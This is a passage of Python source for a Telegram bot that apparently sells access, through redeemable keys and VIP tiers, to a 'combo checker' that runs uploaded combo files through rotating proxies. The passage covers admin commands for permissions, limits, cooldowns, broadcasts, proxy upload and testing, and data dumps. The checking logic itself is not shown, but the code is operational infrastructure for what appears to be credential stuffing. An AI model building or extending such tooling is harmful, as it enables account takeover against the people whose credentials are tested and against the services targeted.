@admin_or_mini_admin('removevip')
async def cmd_remove_vip(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/removevip &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); users=load_users()
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    users[t]["vip"]=False; save_users(users)
    await update.message.reply_text(f" VIP removed: <code>{t}</code>",parse_mode=ParseMode.HTML)

@admin_only
async def cmd_mini_admin_panel(update, context):
    """/miniadminpanel <user_id> [perm1 perm2 ...] — Add/update a Mini Admin"""
    tg=update.effective_user

    if len(context.args) < 1:
        perm_list="\n".join(f"  <code>{k}</code> — {d}" for k,d in MINI_ADMIN_PERMISSIONS)
        await update.message.reply_text(
            f" <b>Mini Admin Panel</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"Usage: <code>/miniadminpanel &lt;user_id&gt; [perm1 perm2 ...]</code>\n\n"
            f" <b>Available Permissions:</b>\n{perm_list}\n\n"
            f"Example:\n<code>/miniadminpanel 123456789 generate_key ban_user stats</code>\n\n"
            f"Leave permissions blank to keep existing ones.\n"
            f"Use /miniadminlist to see all mini admins.\n"
            f"Use /removeminiadmin &lt;uid&gt; to revoke.",
            parse_mode=ParseMode.HTML); return

    target_uid=context.args[0].strip()
    raw_perms=[p.strip().lower() for p in context.args[1:]]
    valid_perms=[p for p in raw_perms if p in MINI_ADMIN_PERM_KEYS]
    bad_perms=[p for p in raw_perms if p not in MINI_ADMIN_PERM_KEYS]

    ma=load_mini_admins()
    users_db=load_users(); udata=users_db.get(target_uid,{})
    uname_r=udata.get("username","?"); fname_r=udata.get("first_name","?")
    existing=ma.get(target_uid,{})
    final_perms=valid_perms if valid_perms else existing.get("permissions",[])
    ma[target_uid]={
        "added_by":tg.id,
        "added_at":existing.get("added_at",datetime.now(timezone.utc).isoformat()),
        "updated_at":datetime.now(timezone.utc).isoformat(),
        "username":uname_r,"first_name":fname_r,
        "permissions":final_perms,"active":True,
        "total_actions":existing.get("total_actions",0),
        "action_log":existing.get("action_log",[]),
    }
    save_mini_admins(ma)

    perms_str="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                          for p in final_perms) or "   None"
    warn_str=(f"\n Unknown perms ignored: <code>{', '.join(bad_perms)}</code>" if bad_perms else "")
    await update.message.reply_text(
        f" <b>Mini Admin Added!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Name : <b>{fname_r}</b> @{uname_r}\n🆔 ID   : <code>{target_uid}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n <b>Granted Permissions:</b>\n{perms_str}{warn_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━\nThey can now use all granted commands directly.",
        parse_mode=ParseMode.HTML)

    # Build personalized command menu
    base_cmds=[
        BotCommand("start"," Start / Home"),BotCommand("redeem"," Redeem a key"),
        BotCommand("check"," Check progress"),BotCommand("stop"," Stop checking"),
        BotCommand("status","ℹ Session status"),BotCommand("myresultsfile"," Get current results file"),
        BotCommand("deletefile"," Delete combo file"),
        BotCommand("clean"," Clean combo file"),BotCommand("cancel"," Cancel session"),
        BotCommand("miniadminpanel"," Mini Admin panel"),
    ]
    perm_to_cmd={k:k for k,_ in MINI_ADMIN_PERMISSIONS}
    perm_to_cmd["generate_key"]="generate_key"; perm_to_cmd["upload_proxy"]="upload_proxy"
    extra_cmds=[BotCommand(perm_to_cmd[p],MINI_ADMIN_PERM_MAP[p])
                for p in final_perms if p in perm_to_cmd]
    try:
        await context.bot.set_my_commands(
            base_cmds+extra_cmds[:50],
            scope=BotCommandScopeChat(chat_id=int(target_uid)))
    except: pass

    try:
        await context.bot.send_message(chat_id=int(target_uid),parse_mode=ParseMode.HTML,
            text=f" <b>Mini Admin Access Granted!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                 f"You now have Mini Admin access.\n\n"
                 f" <b>Your Permissions:</b>\n{perms_str}\n\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f" Use /miniadminpanel to view your panel.\n"
                 f" Restart Telegram if commands don't appear yet.")
    except: pass

@admin_only
async def cmd_remove_mini_admin(update, context):
    """/removeminiadmin <user_id>"""
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/removeminiadmin &lt;user_id&gt;</code>",parse_mode=ParseMode.HTML); return
    target_uid=context.args[0].strip(); ma=load_mini_admins()
    if target_uid not in ma:
        await update.message.reply_text(f" <code>{target_uid}</code> is not a mini admin.",parse_mode=ParseMode.HTML); return
    ma[target_uid]["active"]=False; ma[target_uid]["removed_at"]=datetime.now(timezone.utc).isoformat()
    save_mini_admins(ma); uname_r=ma[target_uid].get("username","?")
    await update.message.reply_text(
        f" <b>Mini Admin Removed</b>\n<code>{target_uid}</code> @{uname_r}\nAccess revoked.",
        parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_message(chat_id=int(target_uid),parse_mode=ParseMode.HTML,
            text=" <b>Mini Admin Access Revoked</b>\nYour mini admin access has been removed.")
    except: pass

@admin_only
async def cmd_mini_admin_list(update, context):
    """List all mini admins."""
    ma=load_mini_admins()
    if not ma:
        await update.message.reply_text(" No mini admins added yet.",parse_mode=ParseMode.HTML); return
    lines=[" <b>Mini Admin List</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for uid2,md in ma.items():
        icon="" if md.get("active") else ""
        perms_s=", ".join(f"<code>{p}</code>" for p in md.get("permissions",[])) or "none"
        lines.append(f"{icon} <b>{md.get('first_name','?')}</b> @{md.get('username','?')} "
                     f"(<code>{uid2}</code>)\n"
                     f"    Perms: {perms_s}\n"
                     f"    Actions: <code>{md.get('total_actions',0)}</code>")
    msg="\n\n".join(lines)
    for chunk in [msg[i:i+4096] for i in range(0,len(msg),4096)]:
        await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

@admin_only
async def cmd_mini_admin_info(update, context):
    """/miniadmininfo <user_id> — view full activity log"""
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/miniadmininfo &lt;user_id&gt;</code>",parse_mode=ParseMode.HTML); return
    target_uid=context.args[0].strip(); ma=load_mini_admins()
    if target_uid not in ma:
        await update.message.reply_text(
            f" <code>{target_uid}</code> is not a mini admin.",parse_mode=ParseMode.HTML); return
    md=ma[target_uid]
    status_s=" Active" if md.get("active") else " Revoked"
    perms_s="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                        for p in md.get("permissions",[])) or "  none"
    header=(f" <b>Mini Admin Info</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Name    : <b>{md.get('first_name','?')}</b> @{md.get('username','?')}\n"
            f"🆔 ID      : <code>{target_uid}</code>\n"
            f" Added   : <code>{md.get('added_at','?')[:10]}</code>\n"
            f" Status  : {status_s}\n"
            f" Actions : <code>{md.get('total_actions',0)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" <b>Permissions:</b>\n{perms_s}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n")
    log_entries=md.get("action_log",[])
    if not log_entries:
        await update.message.reply_text(header+" No actions logged yet.",parse_mode=ParseMode.HTML); return
    log_lines=[" <b>Recent Actions (latest 30):</b>"]
    for i,entry in enumerate(reversed(log_entries[-30:]),1):
        at=entry.get("at","?")[:16].replace("T"," ")
        detail=entry.get("detail","")
        detail_str=f" — <code>{detail[:60]}</code>" if detail else ""
        log_lines.append(f"<code>{i:02d}.</code> <code>{entry.get('action','?')}</code>{detail_str}\n"
                        f"      {at} UTC")
    full=header+"\n".join(log_lines)
    for chunk in [full[i:i+4096] for i in range(0,len(full),4096)]:
        await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  MINI ADMIN SELF-PANEL (for mini admins)
# ════════════════════════════════════════════
async def cmd_mini_admin_self_panel(update, context):
    """/miniadminpanel without args for non-admin users → show their own panel"""
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    # If admin, handled by cmd_mini_admin_panel above (it already shows help)
    if is_admin(tg.id,cfg):
        await cmd_mini_admin_panel(update,context); return
    if not is_mini_admin(tg.id):
        await update.message.reply_text(" You don't have mini admin access."); return
    ma=load_mini_admins(); md=ma.get(uid,{})
    if not md.get("active"):
        await update.message.reply_text(" Your mini admin access has been revoked."); return
    perms=md.get("permissions",[])
    perms_str="\n".join(f"   <code>{p}</code> — {MINI_ADMIN_PERM_MAP.get(p,'')}"
                          for p in perms) or "   None"
    total_act=md.get("total_actions",0)
    recent_log=md.get("action_log",[])[-5:]
    recent=""
    for entry in reversed(recent_log):
        at=entry.get("at","?")[:16].replace("T"," ")
        detail=entry.get("detail","")
        ds=f": <code>{detail[:50]}</code>" if detail else ""
        recent+=f"• <code>{entry.get('action','?')}</code>{ds} ({at})\n"
    await update.message.reply_text(
        f" <b>Mini Admin Panel</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Name     : <b>{tg.first_name}</b>\n"
        f"🆔 ID       : <code>{uid}</code>\n"
        f" Actions  : <code>{total_act}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" <b>Your Permissions:</b>\n{perms_str}\n"
        +(f"━━━━━━━━━━━━━━━━━━━━\n <b>Recent Actions:</b>\n{recent}" if recent else ""),
        parse_mode=ParseMode.HTML)

async def cmd_check_all_users(update,context):
    users=load_users()
    if not users: await update.message.reply_text(" No users yet."); return
    ac=sum(1 for u in users.values() if u.get("activated"))
    bc=sum(1 for u in users.values() if u.get("banned"))
    vc=sum(1 for u in users.values() if u.get("vip"))
    lines=[f" <b>Users ({len(users)})</b>",f"{ac}  {bc}  {vc}","━━━━━━━━━━━━━━━━━━━━"]
    for uid2,u in sorted(users.items(),key=lambda x:x[1].get("joined",""),reverse=True):
        st=" BANNED" if u.get("banned") else (" VIP" if u.get("vip") else (" Active" if u.get("activated") else " No Key"))
        exp=f" | {fmt_expiry(u.get('key_expires_at'))}" if u.get("activated") and not u.get("vip") else ""
        lines.append(f"• <code>{uid2}</code> @{u.get('username','?')}\n  {st} | <code>{u.get('total_checked',0):,}</code>{exp}")
    msg="\n".join(lines)
    for chunk in [msg[i:i+4096] for i in range(0,len(msg),4096)]: await update.message.reply_text(chunk,parse_mode=ParseMode.HTML)

@admin_or_mini_admin('stats')
async def cmd_stats(update,context):
    cfg=load_config(); users=load_users(); keys=load_keys()
    tu=len(users); au=sum(1 for u in users.values() if u.get("activated"))
    eu=sum(1 for u in users.values() if u.get("activated") and key_expired(u.get("key_expires_at")))
    bu=sum(1 for u in users.values() if u.get("banned")); vu=sum(1 for u in users.values() if u.get("vip"))
    tc=sum(u.get("total_checked",0) for u in users.values())
    with sessions_lock: live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    with _queue_lock: waiting=len(_checker_queue)
    pf=list(PROXY_DIR.glob("*.txt")); tp=0
    for f in pf:
        try:
            with open(f,"r",encoding="utf-8",errors="ignore") as fh:
                tp+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
        except: pass
    cds=cfg.get("cooldown_sessions"); cdm=cfg.get("cooldown_minutes",30)
    cd_str=f"{cds} sessions → {cdm}min" if cds else "Off"
    await update.message.reply_text(
        f" <b>Bot Statistics</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Total Users   : <code>{tu}</code>\n Activated     : <code>{au}</code>\n"
        f" Expired keys  : <code>{eu}</code>\n Banned        : <code>{bu}</code>\n VIP           : <code>{vu}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Running       : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code> slots\n"
        f" In queue      : <code>{waiting}</code>\n Total checked : <code>{tc:,}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Keys total    : <code>{len(keys)}</code>\n"
        f" Keys used     : <code>{sum(1 for k in keys.values() if k.get('used_by'))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Proxy files   : <code>{len(pf)}</code>  ({tp:,} proxies)\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f" Locked        : <code>{'YES ' if cfg.get('locked') else 'No '}</code>\n"
        f" Regular limit : <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
        f" VIP limit     : <code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
        f" Cooldown      : <code>{cd_str}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('broadcast')
async def cmd_broadcast(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/broadcast Your message</code>",parse_mode=ParseMode.HTML); return
    msg=" ".join(context.args); users=load_users()
    bt=(f" <b>Announcement</b>\n━━━━━━━━━━━━━━━━━━━━\n{msg}")
    ok=fail=0
    sm=await update.message.reply_text(f" Broadcasting to <code>{len(users)}</code> users…",parse_mode=ParseMode.HTML)
    for uid2 in users:
        try: await context.bot.send_message(chat_id=int(uid2),text=bt,parse_mode=ParseMode.HTML); ok+=1
        except: fail+=1
        await asyncio.sleep(0.05)
    await sm.edit_text(f" <b>Done!</b>  {ok} sent   {fail} failed",parse_mode=ParseMode.HTML)


@admin_or_mini_admin('setlimit')
async def cmd_set_limit(update,context):
    cfg=load_config()
    if not context.args:
        await update.message.reply_text(
            f" <b>Regular User Line Limit</b>\nCurrent: <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
            f"<code>/setlimit 1000</code>  |  <code>/setlimit off</code>",parse_mode=ParseMode.HTML); return
    arg=context.args[0].lower()
    if arg=="off": cfg["global_limit"]=None; save_config(cfg); await update.message.reply_text(" Regular limit removed.",parse_mode=ParseMode.HTML); return
    try:
        n=int(arg)
        if n<1: raise ValueError
        cfg["global_limit"]=n; save_config(cfg)
        await update.message.reply_text(f" Regular limit: <code>{n:,}</code> lines.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Use a number or <code>off</code>.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setlimitforvip')
async def cmd_set_limit_vip(update,context):
    cfg=load_config()
    if not context.args:
        await update.message.reply_text(
            f" <b>VIP Line Limit</b>\nVIP limit: <code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
            f"Regular: <code>{cfg.get('global_limit') or 'Unlimited'}</code>\n"
            f"<code>/setlimitforvip 5000</code>  |  <code>/setlimitforvip off</code>",parse_mode=ParseMode.HTML); return
    arg=context.args[0].lower()
    if arg=="off": cfg["vip_limit"]=None; save_config(cfg); await update.message.reply_text(" VIP limit removed (unlimited).",parse_mode=ParseMode.HTML); return
    try:
        n=int(arg)
        if n<1: raise ValueError
        cfg["vip_limit"]=n; save_config(cfg)
        await update.message.reply_text(f" VIP limit: <code>{n:,}</code> lines.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Use a number or <code>off</code>.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setcd')
async def cmd_set_cd(update,context):
    cfg=load_config()
    if not context.args:
        cs=cfg.get("cooldown_sessions"); cm=cfg.get("cooldown_minutes",30)
        await update.message.reply_text(
            f" <b>Cooldown</b>\nSessions: <code>{'Off' if not cs else cs}</code>  Duration: <code>{cm}min</code>\n"
            f"<code>/setcd 5 30</code>  → after 5 sessions wait 30min\n<code>/setcd off</code>  → disable\n"
            f"<i> VIP bypass cooldown always.</i>",parse_mode=ParseMode.HTML); return
    if context.args[0].lower()=="off":
        cfg["cooldown_sessions"]=None; save_config(cfg)
        await update.message.reply_text(" <b>Cooldown disabled.</b>",parse_mode=ParseMode.HTML); return
    if len(context.args)<2:
        await update.message.reply_text("Usage: <code>/setcd &lt;sessions&gt; &lt;minutes&gt;</code>",parse_mode=ParseMode.HTML); return
    try:
        s=int(context.args[0]); m=int(context.args[1])
        if s<1 or m<1: raise ValueError
        cfg["cooldown_sessions"]=s; cfg["cooldown_minutes"]=m; save_config(cfg)
        await update.message.reply_text(f" Cooldown: after <code>{s}</code> sessions → wait <code>{m}</code>min\n VIP exempt.",parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(" Example: <code>/setcd 5 30</code>",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('setconcurrent')
async def cmd_set_concurrent(update,context):
    if not context.args:
        await update.message.reply_text(
            f" <b>Max Concurrent Checkers</b>\nCurrent: <code>{MAX_CONCURRENT_CHECKERS}</code>\n"
            f"<code>/setconcurrent 10</code>  (range: 1–50)\n<i>1 per 512MB RAM recommended.</i>",parse_mode=ParseMode.HTML); return
    try:
        n=int(context.args[0])
        if n<1 or n>50: raise ValueError
    except: await update.message.reply_text(" Use a number 1–50.",parse_mode=ParseMode.HTML); return
    old=MAX_CONCURRENT_CHECKERS; rebuild_semaphore(n)
    cfg=load_config(); cfg["max_concurrent"]=n; save_config(cfg)
    await update.message.reply_text(f" Updated: <code>{old}</code> → <code>{n}</code> simultaneous checkers.",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('upload_proxy')
async def cmd_upload_proxy(update,context):
    uid=str(update.effective_user.id)
    with sessions_lock: active_sessions.setdefault(uid,{}); active_sessions[uid]["awaiting_proxy"]=True
    await update.message.reply_text(
        " <b>Upload Proxy File</b>\n━━━━━━━━━━━━━━━━━━━━\nSend a <code>.txt</code> file now.\nOne proxy per line:\n"
        "<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>http://host:port</code>\n<code>socks5://host:port</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('proxystatus')
async def cmd_proxy_status(update,context):
    pf=sorted(PROXY_DIR.glob("*.txt"))
    if not pf: await update.message.reply_text(" No proxy files.\nUse <code>/upload_proxy</code>.",parse_mode=ParseMode.HTML); return
    total=0; lines=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for p in pf:
        try:
            with open(p,"r",encoding="utf-8",errors="ignore") as f:
                cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            total+=cnt; lines.append(f" <code>{p.name}</code>\n    {cnt:,} proxies  ·  {ss}")
        except: lines.append(f" <code>{p.name}</code>   unreadable")
    lines+=[f"━━━━━━━━━━━━━━━━━━━━",f" Total: <code>{total:,}</code> in <code>{len(pf)}</code> file(s)"]
    await update.message.reply_text("\n".join(lines),parse_mode=ParseMode.HTML)

@admin_or_mini_admin('removeproxy')
async def cmd_remove_proxy(update,context):
    pf=sorted(PROXY_DIR.glob("*.txt"))
    if not pf:
        await update.message.reply_text(" No proxy files.\nUse <code>/upload_proxy</code> to add one.",parse_mode=ParseMode.HTML); return
    lines=[" <b>Proxy Files</b> — tap a button to delete:\n━━━━━━━━━━━━━━━━━━━━"]
    btns=[]
    for p in pf:
        try:
            with open(p,"r",encoding="utf-8",errors="ignore") as f:
                cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
            sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
            lines.append(f" <code>{p.name}</code>  ({cnt:,} proxies · {ss})")
        except: lines.append(f" <code>{p.name}</code>   unreadable")
        btns.append([InlineKeyboardButton(f" Delete  {p.name}",callback_data=f"delproxy_{p.name}")])
    btns.append([InlineKeyboardButton(" Delete ALL proxy files",callback_data="delproxy_ALL")])
    lines.append(f"━━━━━━━━━━━━━━━━━━━━\nTotal: <code>{len(pf)}</code> file(s)")
    await update.message.reply_text("\n".join(lines),reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)

@admin_or_mini_admin('checkproxy')
async def cmd_check_proxy(update,context):
    """
    /checkproxy              — list proxy files with buttons
    /checkproxy file.txt     — show options for that file
    /checkproxy file.txt sample — test 5 spread lines
    /checkproxy file.txt all    — test ALL lines (concurrent)
    /checkproxy file.txt 5      — test line #5
    """
    from concurrent.futures import ThreadPoolExecutor as _TPE,as_completed as _asc
    args=context.args or []
    pf=sorted(PROXY_DIR.glob("*.txt"))

    if not args:
        if not pf:
            await update.message.reply_text(" No proxy files.",parse_mode=ParseMode.HTML); return
        lines_out=[" <b>Proxy Files</b>\n━━━━━━━━━━━━━━━━━━━━"]
        btns=[]
        for p in pf:
            try:
                with open(p,"r",encoding="utf-8",errors="ignore") as f:
                    cnt=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("#"))
                sz=p.stat().st_size; ss=f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
                lines_out.append(f" <code>{p.name}</code>  ·  {cnt:,} proxies  ·  {ss}")
            except: lines_out.append(f" <code>{p.name}</code>")
            btns.append([InlineKeyboardButton(f" {p.name}",callback_data=f"chkprx_menu_{p.name}")])
        lines_out.append("━━━━━━━━━━━━━━━━━━━━\nTap a file to check it.")
        await update.message.reply_text("\n".join(lines_out),
            reply_markup=InlineKeyboardMarkup(btns),parse_mode=ParseMode.HTML)
        return

    fname=args[0]; fpath=PROXY_DIR/fname
    if not fpath.exists():
        await update.message.reply_text(f" File not found: <code>{fname}</code>",parse_mode=ParseMode.HTML); return
    with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
        all_lines=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    total=len(all_lines)
    if total==0:
        await update.message.reply_text(f" <code>{fname}</code> is empty.",parse_mode=ParseMode.HTML); return
    mode=args[1].lower() if len(args)>1 else None

    if mode is None:
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton(" Sample (5)",callback_data=f"chkprx_sample_{fname}")],
            [InlineKeyboardButton(" Check ALL",callback_data=f"chkprx_all_{fname}")],
            [InlineKeyboardButton(" Specific line…",callback_data=f"chkprx_askline_{fname}")],
        ])
        await update.message.reply_text(
            f" <b>{fname}</b>  ·  <code>{total:,}</code> proxies\n━━━━━━━━━━━━━━━━━━━━\nChoose mode:",
            reply_markup=kb,parse_mode=ParseMode.HTML)
        return

    if mode=="sample":
        idx=[0,total//4,total//2,3*total//4,total-1]
        sample=[all_lines[i] for i in dict.fromkeys(idx) if i<total][:5]
        msg=await update.message.reply_text(
            f" Checking {len(sample)} sample proxies from <code>{fname}</code>…",parse_mode=ParseMode.HTML)
        results=[]
        loop=asyncio.get_event_loop()
        for ln in sample:
            ok_s,_=await loop.run_in_executor(None,_test_proxy_sync,ln)
            results.append(f"{'' if ok_s else ''} Line {all_lines.index(ln)+1}: <code>{ln[:55]}</code>")
        working=sum(1 for r in results if r.startswith(""))
        out=(f"{'' if working==len(sample) else '' if working>0 else ''} <b>{fname}</b> — {working}/{len(sample)} working\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"+"\n".join(results))
        try: await msg.edit_text(out,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(out,parse_mode=ParseMode.HTML)
        return

    if mode=="all":
        msg=await update.message.reply_text(
            f" Checking ALL <code>{total:,}</code> proxies from <code>{fname}</code>…\nThis may take a while.",
            parse_mode=ParseMode.HTML)
        results_map={}
        def _ci(il):
            i,ln=il; ok_r,err_r=_test_proxy_sync(ln); return i,ln,ok_r,err_r
        with _TPE(max_workers=20) as ex:
            futs={ex.submit(_ci,(i,ln)):i for i,ln in enumerate(all_lines,1)}
            for fut in _asc(futs):
                try:
                    i,ln,ok_r,err_r=fut.result(); results_map[i]=(ln,ok_r,err_r)
                except: pass
        working_l=[(i,ln) for i,(ln,ok_r,_) in sorted(results_map.items()) if ok_r]
        dead_l   =[(i,ln,err_r) for i,(ln,ok_r,err_r) in sorted(results_map.items()) if not ok_r]
        tok=len(working_l); pct=int(tok/total*100) if total else 0
        out_lines=[
            f"{'' if pct>=80 else ''} <b>{fname}</b> — {tok}/{total} working ({pct}%)",
            f"━━━━━━━━━━━━━━━━━━━━",
            f" Working   : <code>{tok:,}</code>",
            f" Dead/Error: <code>{len(dead_l):,}</code>",
        ]
        if dead_l:
            from collections import Counter as _Ctr2
            err_ctr2=_Ctr2(err_r for _,_,err_r in dead_l if err_r)
            if err_ctr2:
                out_lines.append(f" Errors: {', '.join(f'{v}x {k}' for k,v in err_ctr2.most_common(4))}")
            out_lines.append("━━━━━━━━━━━━━━━━━━━━")
            dp="\n".join(f"   Line {i}: <code>{ln[:45]}</code> — {err_r}" for i,ln,err_r in dead_l[:15])
            if len(dead_l)>15: dp+=f"\n  … and {len(dead_l)-15} more"
            out_lines+=["<b>Dead / Error proxies:</b>",dp,"━━━━━━━━━━━━━━━━━━━━"]
        kb2=None
        if dead_l:
            kb2=InlineKeyboardMarkup([
                [InlineKeyboardButton(f" Remove {len(dead_l):,} dead/error (this file)",
                                     callback_data=f"chkprx_rmdeadlines_{fname}")],
                [InlineKeyboardButton(f" Remove dead/error from ALL files",
                                     callback_data="chkprx_rmdeadlines_ALL_")],
            ])
        full="\n".join(out_lines)
        if len(full)>4000: full=full[:4000]+"…"
        try: await msg.edit_text(full,reply_markup=kb2,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(full,reply_markup=kb2,parse_mode=ParseMode.HTML)
        return

    # Specific line number
    try:
        line_num=int(mode)
        if line_num<1 or line_num>total:
            await update.message.reply_text(f" Line {line_num} out of range (1–{total:,}).",parse_mode=ParseMode.HTML); return
        ln=all_lines[line_num-1]
        msg=await update.message.reply_text(
            f" Checking line <code>{line_num}</code> of <code>{fname}</code>…",parse_mode=ParseMode.HTML)
        ok_ln,_=await asyncio.get_event_loop().run_in_executor(None,_test_proxy_sync,ln)
        out=f"{' Working' if ok_ln else ' Dead/Error'}  — Line {line_num}\n━━━━━━━━━━━━━━━━━━━━\n<code>{ln}</code>"
        try: await msg.edit_text(out,parse_mode=ParseMode.HTML)
        except: await update.message.reply_text(out,parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f" Unknown mode <code>{mode}</code>. Use: sample | all | line_number",
            parse_mode=ParseMode.HTML)


@admin_or_mini_admin('pasteproxy')
async def cmd_paste_proxy(update,context):
    """Set admin as awaiting pasted proxy lines."""
    uid=str(update.effective_user.id)
    with sessions_lock:
        active_sessions.setdefault(uid,{})
        active_sessions[uid]["awaiting_proxy_paste"]=True
    await update.message.reply_text(
        " <b>Paste Proxy Lines</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Paste your proxies now (one per line).\n"
        "Supported formats:\n"
        "<code>host:port</code>\n"
        "<code>host:port:user:pass</code>\n"
        "<code>http://host:port</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "I'll save them to a new file in the proxy folder automatically.",
        parse_mode=ParseMode.HTML)


@admin_only
async def cmd_send_data(update, context):
    """
    /senddata              — send ALL data files as individual messages
    /senddata config       — send only config.json
    /senddata users        — send only users.json
    /senddata keys         — send only keys.json
    /senddata sessions     — send only sessions_persist.json
    /senddata miniadmins   — send only mini_admins.json
    """
    # Map of shorthand → actual file
    DATA_FILES = {
        "config":     CONFIG_FILE,
        "users":      USERS_FILE,
        "keys":       KEYS_FILE,
        "sessions":   SESSIONS_FILE,
        "miniadmins": MINI_ADMINS_FILE,
    }

    arg = context.args[0].strip().lower() if context.args else None

    async def _send_file(path: Path, label: str):
        """Send a single data file, handle missing gracefully."""
        if not path.exists():
            await update.message.reply_text(
                f" <b>{label}</b> does not exist yet.", parse_mode=ParseMode.HTML)
            return
        size = path.stat().st_size
        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/1024/1024:.2f} MB"
        # Pretty-print JSON for readability
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            pretty = json.dumps(data, indent=2, ensure_ascii=False)
            bio = io.BytesIO(pretty.encode("utf-8"))
            bio.name = path.name
        except Exception:
            bio = open(path, "rb")
        try:
            await update.message.reply_document(
                document=bio,
                filename=path.name,
                caption=(f" <b>{path.name}</b>\n"
                         f" Size: <code>{size_str}</code>\n"
                         f" <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"),
                parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(
                f" Failed to send <code>{path.name}</code>: {e}",
                parse_mode=ParseMode.HTML)
        finally:
            if hasattr(bio, 'close'): bio.close()

    if arg:
        if arg not in DATA_FILES:
            valid = ", ".join(f"<code>{k}</code>" for k in DATA_FILES)
            await update.message.reply_text(
                f" Unknown file: <code>{arg}</code>\n"
                f"Valid options: {valid}\n"
                f"Or use <code>/senddata</code> (no args) to send all.",
                parse_mode=ParseMode.HTML)
            return
        await _send_file(DATA_FILES[arg], arg)
    else:
        # Send all files
        msg = await update.message.reply_text(
            f" Sending <code>{len(DATA_FILES)}</code> data files…",
            parse_mode=ParseMode.HTML)
        for label, path in DATA_FILES.items():
            await _send_file(path, label)
        try: await msg.delete()
        except: pass



@admin_only
async def cmd_reload_bot(update,context):
    """Fully restart the bot process (uses os.execv to replace current process)."""
    await update.message.reply_text(
        " <b>Restarting bot…</b>\nWill be back in a few seconds.",
        parse_mode=ParseMode.HTML)
    import os, sys
    # Give Telegram time to deliver the message before we die
    await asyncio.sleep(1.5)
    os.execv(sys.executable, [sys.executable] + sys.argv)


@admin_or_mini_admin('refresh')
async def cmd_refresh(update,context):
    """Reload config, proxy list, and limits live — no restart needed."""
    cfg=load_config()
    # Reload semaphore if max_concurrent changed
    saved_mc=cfg.get("max_concurrent",5)
    if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
    # Reload proxy rotator
    try:
        import dec_tyrantv12 as _dty
        _dty.geo_rotator.__init__()
        proxy_status=f" Reloaded ({_dty.geo_rotator.total} proxies)"
    except Exception as e:
        proxy_status=f" {e}"
    with sessions_lock:
        live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    gl=cfg.get("global_limit") or "Unlimited"
    vl=cfg.get("vip_limit") or "Unlimited"
    thr=cfg.get("default_threads",5)
